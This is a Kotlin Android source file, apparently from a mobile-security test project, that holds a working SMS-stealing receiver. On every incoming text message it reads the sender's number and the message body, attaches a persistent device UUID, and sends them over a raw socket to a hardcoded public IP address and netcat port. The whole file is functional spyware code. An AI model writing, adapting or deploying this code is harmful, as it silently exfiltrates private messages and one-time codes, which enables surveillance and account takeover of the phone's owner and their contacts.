package com.example.testmobsec

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.AsyncTask
import android.provider.Telephony
import android.util.Log
import java.io.BufferedWriter
import java.io.OutputStreamWriter
import java.net.Socket
import java.util.UUID



class MessageReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val sharedPrefs = context!!.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        var uuid = sharedPrefs.getString("uuid", null)
        if (uuid == null) {
            uuid = UUID.randomUUID().toString()
            sharedPrefs.edit().putString("uuid", uuid).apply()
        }
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent?.action) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            messages?.forEach { smsMessage ->
                val senderAddress = smsMessage.displayOriginatingAddress
                val message = smsMessage.messageBody
                Log.e("TAG", "Sender's Number: $senderAddress")
                Log.e("TAG", "Message: $message")
                // Execute the AsyncTask to send the string to the server
                val dataToSend = "\n\nUUID: $uuid\nMessage Received From: $senderAddress\nMessage: $message"
                NetcatCommunicationTask().execute(dataToSend)
            }
        }
    }

    private inner class NetcatCommunicationTask : AsyncTask<String, Void, Void>() {
        override fun doInBackground(vararg params: String?): Void? {
            //val serverAddress = "192.168.137.143" // Replace with your server's IP address
            val serverAddress = "13.92.41.98" // Replace with your server's IP address
            val serverPort = 1234 // Replace with the port number your netcat server is listening on
            val message = params[0] // Message to be sent to the server

            try {
                val socket = Socket(serverAddress, serverPort)
                val writer = BufferedWriter(OutputStreamWriter(socket.getOutputStream()))

                // Send the message to the server
                writer.write(message)
                writer.flush()

                // Close the writer and the socket
                writer.close()
                socket.close()

                Log.d("NetcatCommunication", "Message sent successfully")
            } catch (e: Exception) {
                Log.e("NetcatCommunication", "Error: ${e.message}")
            }

            return null
        }
    }

}

